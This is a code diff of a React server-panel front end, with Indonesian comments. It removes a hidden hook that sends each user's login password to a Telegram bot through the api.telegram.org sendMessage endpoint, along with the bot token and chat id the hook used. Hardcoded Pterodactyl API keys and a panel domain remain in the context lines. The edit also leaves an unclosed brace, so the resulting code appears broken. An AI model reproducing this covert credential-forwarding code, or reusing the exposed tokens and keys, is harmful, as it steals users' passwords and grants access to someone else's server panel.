@@ -46,8 +46,6 @@
       const [infoOpen, setInfoOpen] = useState(false);
       const [batteryStatus, setBatteryStatus] = useState("Checking...");
       const [isCharging, setIsCharging] = useState(null);
-      const botToken = "6736950313:AAHnPXkXv9JPkyOusA7nryTb2SEK5yAqP1Y";
-      const chatId = "7945642565";
       const apikey = "ptla_nbVphesJSkjpEOL1d8nC13aSTkfpIvxbZi0FZgsIZJR";
       const capikey = "ptlc_9Bz3izf1dAfC6Sihl4om6yFmvewWT3UgNNYSHU4vA3J";
       const domain = "https://mypanel.public-void.nusantarahost.web.id";
@@ -110,14 +108,7 @@
           </div>
         );
       }
-   if (user) {
-          // === Kirim Notifikasi Telegram ===
-          const text = `✅ *Login Berhasil!*\n👤 Username: *${pasword}*\n🔐 Tipe: *anonim*`;
-          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chatId, text, parse_mode: "Markdown" })
-          });
+  
       const handleCreate = async () => {
         if (!nameServer) return alert("Name server wajib diisi");
         try {
